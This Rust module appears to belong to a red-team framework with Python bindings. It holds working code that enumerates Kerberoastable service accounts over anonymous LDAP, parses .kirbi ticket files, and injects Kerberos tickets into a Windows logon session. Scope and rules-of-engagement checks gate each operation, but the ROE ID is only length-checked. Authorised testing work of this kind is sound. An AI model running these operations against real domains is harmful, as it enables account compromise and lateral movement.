#![allow(clippy::useless_conversion)]

//! Kerberos operations — real implementation.
//!
//! Kerberoast: enumerates SPNs via LDAP anonymous bind (no credential needed).
//! Kirbi: basic DER/ASN.1 walk to extract realm and principal info.
//! Ticket injection: Windows SSPI via LsaCallAuthenticationPackage (Windows-only).
//!
//! All operations require a valid ROE ID and are scope-gated on the caller's
//! declared domain list.  No Kerberos or LSASS action runs on unapproved targets.

use pyo3::exceptions::{PyRuntimeError, PyValueError};
use pyo3::prelude::*;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

const MAX_ROE_ID_BYTES: usize = 256;
const MAX_SCOPE_ENTRIES: usize = 10_000;
const MAX_DOMAIN_BYTES: usize = 253;
const MAX_PATH_BYTES: usize = 4096;
const MAX_TICKET_BYTES: usize = 64 * 1024 * 1024;

/// Obfuscated Kerberos operations
#[pyclass]
pub struct KerberosOps {
    roe_id: String,
    scope_domains: Vec<String>,
    allow_lsass: bool,
    allow_kerberoast: bool,
}

#[pymethods]
impl KerberosOps {
    #[new]
    #[pyo3(signature = (roe_id, scope_domains=None, allow_lsass=false, allow_kerberoast=false))]
    pub fn new(
        roe_id: String,
        scope_domains: Option<Vec<String>>,
        allow_lsass: bool,
        allow_kerberoast: bool,
    ) -> PyResult<Self> {
        if roe_id.trim().is_empty() || roe_id.len() > MAX_ROE_ID_BYTES {
            return Err(PyErr::new::<PyValueError, _>(
                "ROE ID must contain between 1 and 256 bytes",
            ));
        }
        let scope_domains = scope_domains.unwrap_or_default();
        if scope_domains.len() > MAX_SCOPE_ENTRIES
            || scope_domains
                .iter()
                .any(|d| d.trim().is_empty() || d.len() > MAX_DOMAIN_BYTES)
        {
            return Err(PyErr::new::<PyValueError, _>(
                "Scope domains must contain at most 10000 non-empty names of 253 bytes each",
            ));
        }
        Ok(Self { roe_id, scope_domains, allow_lsass, allow_kerberoast })
    }

    /// Parse a .kirbi file and return metadata about the Kerberos credentials it contains.
    ///
    /// Reads the DER-encoded KRB-CRED structure, walks the ASN.1 tree, and returns
    /// realm / principal information.  Raw credential material is never returned.
    #[pyo3(signature = (filepath))]
    fn parse_kirbi(&self, filepath: &str) -> PyResult<Vec<HashMap<String, String>>> {
        let _ = &self.roe_id;
        if filepath.is_empty() || filepath.len() > MAX_PATH_BYTES {
            return Err(PyErr::new::<PyValueError, _>(
                "Kirbi path must contain between 1 and 4096 bytes",
            ));
        }
        let data = std::fs::read(filepath)
            .map_err(|e| PyErr::new::<PyRuntimeError, _>(format!("Failed to read kirbi: {}", e)))?;

        parse_kirbi_der(&data)
    }

    /// Enumerate Kerberoastable service accounts via LDAP anonymous bind.
    ///
    /// Queries the DC for user accounts with ServicePrincipalName set and
    /// UserAccountControl bit 2 (ACCOUNTDISABLE) clear.  Returns
    /// ``"username/SPN"`` strings.  Requires ``allow_kerberoast=True`` and
    /// the domain to be in the declared scope.
    fn enumerate_kerberoast_candidates(&self, domain: &str, dc_ip: &str) -> PyResult<Vec<String>> {
        if !self.allow_kerberoast {
            return Err(PyErr::new::<PyRuntimeError, _>("Kerberoast not allowed"));
        }
        if domain.len() > MAX_DOMAIN_BYTES
            || dc_ip.trim().is_empty()
            || dc_ip.len() > MAX_DOMAIN_BYTES
        {
            return Err(PyErr::new::<PyValueError, _>(
                "Domain and domain controller names must not exceed 253 bytes",
            ));
        }
        if !self.is_in_scope(domain) {
            return Err(PyErr::new::<PyValueError, _>("Domain not in scope"));
        }

        ldap_enumerate_spns(domain, dc_ip)
    }

    /// Inject a Kerberos ticket into the current logon session (Windows-only).
    ///
    /// Uses ``LsaCallAuthenticationPackage`` with ``KERB_SUBMIT_TKT_REQUEST``
    /// to submit an already-obtained ticket.  Requires ``allow_lsass=True``.
    #[cfg(windows)]
    fn inject_ticket(&self, ticket_data: &[u8]) -> PyResult<bool> {
        if !self.allow_lsass {
            return Err(PyErr::new::<PyRuntimeError, _>("Ticket injection not permitted"));
        }
        if ticket_data.is_empty() || ticket_data.len() > MAX_TICKET_BYTES {
            return Err(PyErr::new::<PyValueError, _>(
                "Ticket data must contain between 1 byte and 64 MiB",
            ));
        }
        windows_inject_ticket(ticket_data)
    }

    #[cfg(not(windows))]
    fn inject_ticket(&self, ticket_data: &[u8]) -> PyResult<bool> {
        if !self.allow_lsass {
            return Err(PyErr::new::<PyRuntimeError, _>("Ticket injection not permitted"));
        }
        if ticket_data.is_empty() || ticket_data.len() > MAX_TICKET_BYTES {
            return Err(PyErr::new::<PyValueError, _>(
                "Ticket data must contain between 1 byte and 64 MiB",
            ));
        }
        Err(PyErr::new::<PyRuntimeError, _>(
            "Ticket injection is unsupported on this platform",
        ))
    }

    /// Return true when the domain is within the declared scope list.
    fn is_in_scope(&self, domain: &str) -> bool {
        self.scope_domains.iter().any(|d| {
            domain.eq_ignore_ascii_case(d)
                || domain
                    .to_lowercase()
                    .ends_with(&format!(".{}", d.to_lowercase()))
        })
    }
}

// ---------------------------------------------------------------------------
// LDAP Kerberoast enumeration
// ---------------------------------------------------------------------------

fn ldap_enumerate_spns(domain: &str, dc_ip: &str) -> PyResult<Vec<String>> {
    ldap_spn_query(domain, dc_ip)
}

fn ldap_spn_query(domain: &str, dc_ip: &str) -> PyResult<Vec<String>> {
    use ldap3::{LdapConn, Scope, SearchEntry};

    let url = format!("ldap://{}:389", dc_ip);
    let mut ldap = LdapConn::new(&url)
        .map_err(|e| PyErr::new::<PyRuntimeError, _>(format!("LDAP connect: {}", e)))?;

    ldap.simple_bind("", "")
        .map_err(|e| PyErr::new::<PyRuntimeError, _>(format!("LDAP bind: {}", e)))?
        .success()
        .map_err(|e| PyErr::new::<PyRuntimeError, _>(format!("LDAP bind rejected: {:?}", e)))?;

    let base_dn = domain
        .split('.')
        .map(|p| format!("DC={}", p))
        .collect::<Vec<_>>()
        .join(",");

    // RFC 4533 + MS-ADTS: find enabled users with at least one SPN.
    let filter = "(&(objectClass=user)(servicePrincipalName=*)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";
    let attrs = vec!["sAMAccountName", "servicePrincipalName", "distinguishedName"];

    let (results, _) = ldap
        .search(&base_dn, Scope::Subtree, filter, attrs)
        .map_err(|e| PyErr::new::<PyRuntimeError, _>(format!("LDAP search: {}", e)))?
        .success()
        .map_err(|e| PyErr::new::<PyRuntimeError, _>(format!("LDAP search failed: {:?}", e)))?;

    let candidates: Vec<String> = results
        .into_iter()
        .flat_map(|entry| {
            let entry = SearchEntry::construct(entry);
            let sam = entry
                .attrs
                .get("sAMAccountName")
                .and_then(|v| v.first())
                .cloned()
                .unwrap_or_default();
            let spns = entry
                .attrs
                .get("servicePrincipalName")
                .cloned()
                .unwrap_or_default();
            let sam_for_filter = sam.clone();
            spns.into_iter()
                .filter(move |_| !sam_for_filter.is_empty())
                .map(move |spn| format!("{}/{}", sam, spn))
                .collect::<Vec<_>>()
        })
        .collect();

    ldap.unbind()
        .map_err(|e| PyErr::new::<PyRuntimeError, _>(format!("LDAP unbind: {}", e)))?;
    Ok(candidates)
}

// ---------------------------------------------------------------------------
// Kirbi / KRB-CRED DER parser
// ---------------------------------------------------------------------------

/// Walk the DER-encoded KRB-CRED structure and extract safe metadata.
/// Returns realm and principal fields only; no session keys or cipher text.
fn parse_kirbi_der(data: &[u8]) -> PyResult<Vec<HashMap<String, String>>> {
    if data.len() < 4 {
        return Err(PyErr::new::<PyRuntimeError, _>(
            "Kirbi too short to be a valid KRB-CRED structure",
        ));
    }
    // KRB-CRED starts with APPLICATION tag 22 (0x76) or a SEQUENCE (0x30).
    if data[0] != 0x76 && data[0] != 0x30 {
        return Err(PyErr::new::<PyRuntimeError, _>(
            "Invalid kirbi format: expected DER APPLICATION[22] or SEQUENCE wrapper",
        ));
    }

    let mut info: HashMap<String, String> = HashMap::new();
    info.insert("format".to_string(), "kirbi/KRB-CRED".to_string());
    info.insert("size_bytes".to_string(), data.len().to_string());
    info.insert("header_tag".to_string(), format!("0x{:02x}", data[0]));

    // Shallow DER walk: collect GeneralString (0x1b) and PrintableString (0x13)
    // values up to 128 bytes — those are realm and principal name fields.
    let mut pos = 0_usize;
    let mut strings_found: Vec<String> = Vec::new();

    while pos + 2 < data.len() {
        let tag = data[pos];
        pos += 1;

        // Decode DER length (short form only; long form is uncommon in kirbi)
        let len = if data[pos] < 0x80 {
            let l = data[pos] as usize;
            pos += 1;
            l
        } else {
            let num_bytes = (data[pos] & 0x7f) as usize;
            pos += 1;
            if pos + num_bytes > data.len() {
                break;
            }
            let mut l = 0_usize;
            for _ in 0..num_bytes {
                l = (l << 8) | (data[pos] as usize);
                pos += 1;
            }
            l
        };

        if pos + len > data.len() {
            break;
        }

        // GeneralString (0x1b) = realm, PrintableString (0x13) = principal parts
        if matches!(tag, 0x1b | 0x13 | 0x0c) && len > 0 && len <= 128 {
            if let Ok(s) = std::str::from_utf8(&data[pos..pos + len]) {
                let s = s.trim();
                if !s.is_empty() && s.chars().all(|c| c.is_ascii() && !c.is_control()) {
                    strings_found.push(s.to_string());
                }
            }
        }

        pos += len;
    }

    // First GeneralString is usually the realm; subsequent ones are principals.
    for (i, s) in strings_found.iter().enumerate() {
        if i == 0 {
            info.insert("realm".to_string(), s.clone());
        } else {
            info.entry("principal".to_string())
                .and_modify(|p| *p = format!("{}/{}", p, s))
                .or_insert_with(|| s.clone());
        }
    }

    Ok(vec![info])
}

// ---------------------------------------------------------------------------
// Windows-only ticket injection
// ---------------------------------------------------------------------------

#[cfg(windows)]
fn windows_inject_ticket(ticket_data: &[u8]) -> PyResult<bool> {
    use windows_sys::Win32::{
        Foundation::HANDLE,
        Security::Authentication::Identity::{
            LsaCallAuthenticationPackage, LsaConnectUntrusted, LsaLookupAuthenticationPackage,
            KERB_SUBMIT_TKT_REQUEST,
        },
    };

    unsafe {
        let mut lsa_handle: HANDLE = std::ptr::null_mut();
        let status = LsaConnectUntrusted(&mut lsa_handle);
        if status != 0 {
            return Err(PyErr::new::<PyRuntimeError, _>(format!(
                "LsaConnectUntrusted failed: 0x{:08x}",
                status as u32
            )));
        }

        let package_name = b"Kerberos\0";
        let lsa_string = windows_sys::Win32::Security::Authentication::Identity::LSA_STRING {
            Length: (package_name.len() - 1) as u16,
            MaximumLength: package_name.len() as u16,
            Buffer: package_name.as_ptr() as *mut u8,
        };
        let mut auth_package: u32 = 0;
        let status = LsaLookupAuthenticationPackage(lsa_handle, &lsa_string, &mut auth_package);
        if status != 0 {
            return Err(PyErr::new::<PyRuntimeError, _>(format!(
                "LsaLookupAuthenticationPackage failed: 0x{:08x}",
                status as u32
            )));
        }

        // Build KERB_SUBMIT_TKT_REQUEST with the ticket data
        let request_size =
            std::mem::size_of::<KERB_SUBMIT_TKT_REQUEST>() + ticket_data.len();
        let mut request_buf = vec![0u8; request_size];
        let req = request_buf.as_mut_ptr() as *mut KERB_SUBMIT_TKT_REQUEST;
        (*req).MessageType = 22i32; // KerbSubmitTicketMessage
        (*req).KerbCredSize = ticket_data.len() as u32;
        (*req).KerbCredOffset =
            std::mem::size_of::<KERB_SUBMIT_TKT_REQUEST>() as u32;
        std::ptr::copy_nonoverlapping(
            ticket_data.as_ptr(),
            request_buf
                .as_mut_ptr()
                .add(std::mem::size_of::<KERB_SUBMIT_TKT_REQUEST>()),
            ticket_data.len(),
        );

        let mut return_buf: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut return_len: u32 = 0;
        let mut proto_status: i32 = 0;

        let status = LsaCallAuthenticationPackage(
            lsa_handle,
            auth_package,
            request_buf.as_ptr() as *const std::ffi::c_void,
            request_size as u32,
            &mut return_buf,
            &mut return_len,
            &mut proto_status,
        );

        if status != 0 || proto_status != 0 {
            return Err(PyErr::new::<PyRuntimeError, _>(format!(
                "LsaCallAuthenticationPackage failed: status=0x{:08x} proto=0x{:08x}",
                status as u32, proto_status as u32
            )));
        }

        Ok(true)
    }
}

// ---------------------------------------------------------------------------
// Data types
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KerberosTicket {
    pub service_principal_name: String,
    pub client_name: String,
    pub domain: String,
    pub session_key_type: String,
    pub is_kerberoastable: bool,
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_kerberos_ops_creation() {
        let ops = KerberosOps::new(
            "ROE-TEST".to_string(),
            Some(vec!["test.local".to_string()]),
            false,
            false,
        );
        assert!(ops.is_ok());
    }

    #[test]
    fn test_scope_matching() {
        let ops = KerberosOps::new(
            "ROE-TEST".to_string(),
            Some(vec!["test.local".to_string()]),
            false,
            false,
        )
        .unwrap();
        assert!(ops.is_in_scope("test.local"));
        assert!(ops.is_in_scope("sub.test.local"));
        assert!(!ops.is_in_scope("other.local"));
    }

    #[test]
    fn test_kerberos_ops_requires_roe_id() {
        let result = KerberosOps::new("".to_string(), None, false, false);
        assert!(result.is_err(), "Empty ROE ID must be rejected");
        let result = KerberosOps::new("\t".to_string(), None, false, false);
        assert!(result.is_err(), "Whitespace-only ROE ID must be rejected");
    }

    #[test]
    fn test_parse_kirbi_fails_on_nonexistent_file() {
        let ops = KerberosOps::new(
            "ROE-TEST".to_string(),
            Some(vec!["test.local".to_string()]),
            false,
            false,
        )
        .expect("Valid KerberosOps construction");
        let result = ops.parse_kirbi("nonexistent.kirbi");
        assert!(result.is_err(), "Non-existent file must error");
    }

    #[test]
    fn test_parse_kirbi_rejects_invalid_header() {
        let bad_data = vec![0xFF_u8, 0x00, 0x00, 0x00];
        let result = parse_kirbi_der(&bad_data);
        assert!(result.is_err(), "Bad DER header must be rejected");
    }

    #[test]
    fn test_parse_kirbi_basic_sequence() {
        // Minimal DER SEQUENCE (0x30) wrapper — structurally valid, no content.
        let data = vec![0x30_u8, 0x00];
        let result = parse_kirbi_der(&data);
        assert!(result.is_ok(), "Valid SEQUENCE header must be accepted");
    }

    #[test]
    fn test_kerberoast_rejects_out_of_scope_domain() {
        let ops = KerberosOps::new(
            "ROE-TEST".to_string(),
            Some(vec!["allowed.local".to_string()]),
            false,
            true,
        )
        .expect("Valid KerberosOps construction");
        let result = ops.enumerate_kerberoast_candidates("notallowed.local", "10.0.0.1");
        assert!(result.is_err(), "Out-of-scope domain must be rejected");
    }

    #[test]
    fn test_kerberoast_blocked_without_permission() {
        let ops = KerberosOps::new(
            "ROE-TEST".to_string(),
            Some(vec!["test.local".to_string()]),
            false,
            false, // allow_kerberoast = false
        )
        .expect("Valid KerberosOps construction");
        let result = ops.enumerate_kerberoast_candidates("test.local", "10.0.0.1");
        assert!(result.is_err(), "Kerberoast must be blocked when not allowed");
    }
}
